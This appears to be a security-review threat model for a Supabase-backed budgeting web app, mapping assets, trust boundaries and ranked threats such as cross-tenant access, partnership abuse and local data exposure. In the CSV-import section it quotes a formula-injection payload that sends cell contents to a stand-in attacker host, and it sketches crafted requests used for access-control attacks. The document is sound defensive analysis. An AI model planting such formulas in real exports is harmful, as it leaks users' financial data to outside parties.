# 00 — Threat Model & Asset Map

> Phase 1 of the security review. Establishes the asset inventory, trust
> boundaries, and ranked threats that every later phase scores findings
> against. Compliance target: **OWASP Top 10 (2021) + ASVS L1**.

---

## 1. Assets

### 1.1 Data assets (Postgres / Supabase)

| Table                   | Owner column                                | Sharing model                                                   | Sensitivity  |
| ----------------------- | ------------------------------------------- | --------------------------------------------------------------- | ------------ |
| `categories`            | `user_id`                                   | Per-user                                                        | Medium       |
| `user_preferences`      | `user_id`                                   | Per-user                                                        | Medium       |
| `budget_plans`          | `user_id`                                   | Per-user                                                        | High         |
| `budget_items`          | (via `budget_plans.user_id`)                | Per-user (FK chain)                                             | High         |
| `accounts`              | `user_id`                                   | Per-user                                                        | High         |
| `transactions`          | `user_id`                                   | Per-user                                                        | **Critical** |
| `recurring_templates`   | `user_id`                                   | Per-user                                                        | High         |
| `partnerships`          | `user_a_id` + `user_b_id` + `invited_email` | Pair-shared once `status='active'`                              | High         |
| `split_expenses`        | (via active `partnership_id`)               | Pair-shared (both members can RW)                               | High         |
| `auth.users` (Supabase) | n/a (managed)                               | Email exposed only via `get_partner_email` SECURITY DEFINER RPC | Medium       |

### 1.2 Client-side assets

| Asset                                              | Storage                              | Sensitivity  |
| -------------------------------------------------- | ------------------------------------ | ------------ |
| Supabase JWT access + refresh tokens               | `localStorage` (default supabase-js) | **Critical** |
| Cached financial data (mirror of all tables above) | IndexedDB (Dexie `BudgetAppOffline`) | **Critical** |
| Pending offline mutations                          | IndexedDB rows with `_offline=1`     | **Critical** |
| Workbox SW runtime cache (`supabase-api`)          | Cache Storage API                    | High         |
| Split-notifications "seen at" timestamp            | `localStorage` keyed by user id      | Low          |
| `sessionStorage` (ephemeral UI state)              | `sessionStorage`                     | Low          |

### 1.3 Build / runtime assets

| Asset                          | Location                                                                                                                                                     | Sensitivity                             |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------- |
| Supabase URL + anon key        | Runtime via [public/env-config.js](../../public/env-config.js) (templated by [docker-entrypoint.sh](../../docker-entrypoint.sh)); fallback `import.meta.env` | Public-by-design but rotation-sensitive |
| nginx reverse proxy + headers  | [nginx.conf](../../nginx.conf)                                                                                                                               | High                                    |
| Container image                | `thewarguy/budget-app` (Docker Hub)                                                                                                                          | High                                    |
| CI secrets (`DOCKERHUB_TOKEN`) | GitHub Actions secrets                                                                                                                                       | High                                    |

---

## 2. Trust boundaries

```
[Untrusted user input]
   │
   ▼
┌──────────────────────────────────────────────────────────────┐
│ Browser (React SPA + Service Worker)            ── Trust 0 ──│
│   • CSP, no dangerouslySetInnerHTML                           │
│   • IndexedDB / localStorage (UNENCRYPTED at rest)            │
└──────────────────────────────────────────────────────────────┘
                       │  HTTPS  │  JWT bearer
                       ▼         ▼
┌──────────────────────────────────────────────────────────────┐
│ nginx (8085) — static assets + security headers ── Trust 1 ──│
│   • Serves SPA, env-config.js, manifest, sw.js                │
│   • No proxy to Supabase (browser talks direct)               │
└──────────────────────────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────┐
│ Supabase (PostgREST + Realtime + Auth)          ── Trust 2 ──│
│   • Validates JWT signature, exposes auth.uid() to RLS        │
│   • All multi-tenant authz lives in Postgres RLS              │
└──────────────────────────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────┐
│ Postgres (RLS + SECURITY DEFINER RPCs)          ── Trust 3 ──│
│   • Last line of defense                                      │
└──────────────────────────────────────────────────────────────┘
```

**Key invariant:** `auth.uid()` from the validated JWT is the _only_ trustworthy
identity. Any policy or service path that derives ownership from
client-supplied `user_id` is a vulnerability.

---

## 3. Ranked threats

Each threat lists at least one concrete attack path. Attacks are scored
qualitatively: **Likelihood × Impact**.

### T1 — Cross-tenant data leakage (Critical)

_OWASP A01 Broken Access Control · ASVS V4_

- **A1.** Authenticated user A discovers user B's row UUIDs (e.g. via a public
  share link or guess) and crafts a `PATCH /rest/v1/transactions?id=eq.<uuid>`
  request. **Mitigation:** RLS `auth.uid() = user_id` on every table.
- **A2.** Authenticated user A `INSERT`s into a per-user table with
  `user_id=<B's id>`, hoping to plant data in B's account. **Mitigation:**
  `WITH CHECK (auth.uid() = user_id)` on INSERT — present for `transactions`
  via the split policies in [supabase_schema_create.sql](../../sql_scripts/supabase_schema_create.sql),
  but the broader `FOR ALL` policies in
  [supabase_rls_complete.sql](../../sql_scripts/supabase_rls_complete.sql)
  rely on Postgres' implicit "WITH CHECK = USING" rule. **See Phase 2 Finding F-DB-002.**
- **A3.** RLS disabled accidentally during migration. **Mitigation:** weekly
  diagnostic query in [supabase_rls_complete.sql](../../sql_scripts/supabase_rls_complete.sql);
  Phase 2 will add an automated test.

### T2 — Partnership / split-expense privilege abuse (High)

_OWASP A01 / A04 Insecure Design_

- **A1.** Attacker invites `victim@example.com` to a partnership; victim
  accepts; attacker now has read/write on every `split_expenses` row tied to
  that partnership. **Mitigation by design** — split is for trusted partners;
  `is_settlement` flag protects against inflated balance claims via
  `total_amount = payer_share + partner_share` CHECK constraint.
- **A2.** Invitee accepts an invite by setting `status='active'` _without_
  populating `user_b_id` (RLS UPDATE policy doesn't enforce
  `WITH CHECK (user_b_id = auth.uid())` on accept). Result: orphaned active
  partnership; invitee then can't read splits but inviter can plant data. Low
  practical impact, but **Finding F-DB-003.**
- **A3.** Squatting: anyone can INSERT a partnership with a victim's email,
  spamming their pending-invites list. Mitigation: unique index
  `idx_partnerships_pending_invite (user_a_id, invited_email)` limits _one
  inviter per email_ but multiple inviters can each spam once. Acceptable.
- **A4.** Split rows reference `transaction_id` (FK to per-user
  `transactions`). Partner B can `SELECT` a split row whose `transaction_id`
  points to user A's transaction. RLS on `transactions` blocks the join, so
  partner B sees only the `transaction_id` UUID, not the row. **Verified safe.**

### T3 — Malicious CSV import (High)

_OWASP A03 Injection · CWE-1236 Formula Injection_

- **A1.** Attacker sends victim a CSV whose `description` cell is
  `=HYPERLINK("https://evil.example/?x="&A1,"click")`. Victim imports →
  data ingested as plain text (good — React escapes JSX). Victim later
  _exports_ their data → malicious string written verbatim to the new CSV →
  victim opens in Excel → formula executes. **Finding F-FE-001 (Phase 3).**
- **A2.** XLSX with a malicious external-link formula. ExcelJS parses
  `cell.value.result` only — no formula execution in browser. **Verified safe.**
- **A3.** ZIP-bomb / large-row DoS. Mitigation present:
  `MAX_IMPORT_FILE_BYTES = 10 MB` and `MAX_IMPORT_ROWS = 5000`.
- **A4.** Prototype pollution via crafted JSON-like cell values. ExcelJS
  returns primitives or Date/object wrappers — `row[header] = cells[idx]`
  uses `header` (already string) as key. No `__proto__` injection path
  unless the **header row** itself contains `__proto__` or `constructor`.
  **Finding F-FE-002 — guard headers.**

### T4 — Stolen-device / local-data exposure (High)

_OWASP A02 Cryptographic Failures · ASVS V8 Data Protection_

- **A1.** Attacker steals an unlocked device → opens DevTools → reads
  IndexedDB `BudgetAppOffline` → full financial history exposed. **No
  mitigation today.** Discussed under Phase 5 Further Considerations
  (recommended Option B: Web-Crypto session-key encryption of sensitive
  fields).
- **A2.** Multi-user shared device: user A logs out, user B logs in. After
  signOut, IndexedDB and sessionStorage are cleared; **but** the Workbox
  `supabase-api` cache (1 h TTL) and `localStorage` (Supabase JWT, plus
  `splitSeenAt_<uid>`) persist. **Finding F-OF-001 (Phase 5).**
- **A3.** Stale JWT replay. Refresh token in `localStorage` is valid for
  Supabase's default rotation window. Out of scope for app changes
  (Supabase-controlled), but document.

### Lower-priority threats (tracked, not deep-dived)

| ID  | Threat                         | Status                                                                                              |
| --- | ------------------------------ | --------------------------------------------------------------------------------------------------- |
| T5  | Service-worker cache poisoning | Workbox uses immutable hashed asset URLs; runtime cache is NetworkFirst with short TTL. Acceptable. |
| T6  | Compromised npm dependency     | Phase 6 adds `osv-scanner` + `gitleaks` + Dependabot recommendation.                                |
| T7  | Open redirect via React Router | All routes static; `*` wildcard navigates to `/auth`. **Verified safe.**                            |
| T8  | Clickjacking                   | `X-Frame-Options: DENY` + `frame-ancestors 'none'` in CSP. **Verified safe.**                       |
| T9  | MIME sniffing                  | `X-Content-Type-Options: nosniff`. **Verified safe.**                                               |
| T10 | TLS downgrade                  | HSTS `max-age=31536000; includeSubDomains` (assumes upstream proxy enforces TLS).                   |

---

## 4. Reconciliation with existing docs

[docs/SECURITY.md](../SECURITY.md) lists 7 invariants. Status against
implementation:

| Invariant                                       | Status                                                                                                                                                   |
| ----------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1. RLS on every user-data table                 | ✅ Verified — all 9 tables have `ENABLE ROW LEVEL SECURITY` + ≥1 policy                                                                                  |
| 2. All mutations also `.eq("user_id", user.id)` | ⚠️ Mostly — `confirmTransaction`, `skipTransaction`, `updateTransfer` legs, and several `splitExpenses.*` writes rely on RLS only. **Finding F-AC-001.** |
| 3. No `dangerouslySetInnerHTML`                 | ✅ Verified — zero matches across `src/**`                                                                                                               |
| 4. Offline data cleared on logout               | ⚠️ IndexedDB ✅ + sessionStorage ✅; **but** Workbox runtime cache and `localStorage` (`splitSeenAt_*`) are NOT cleared. **Finding F-OF-001.**           |
| 5. All `/app/*` routes use `ProtectedRoute`     | ✅ Verified in [src/App.jsx](../../src/App.jsx)                                                                                                          |
| 6. Anon key is the only credential in bundle    | ✅ Verified — no `service_role` references                                                                                                               |
| 7. Import file/row limits                       | ✅ Verified — 10 MB / 5 000 rows                                                                                                                         |

---

## 5. Out of scope for this review

- Penetration testing of the live Supabase project.
- SOC2 / GDPR data-handling analysis.
- Payment-processing flows (none present).
- Mobile native wrappers / share-target intents.
- Supabase-managed auth flows (password policy, email verification,
  rate-limiting) — controlled by Supabase project settings, not code.
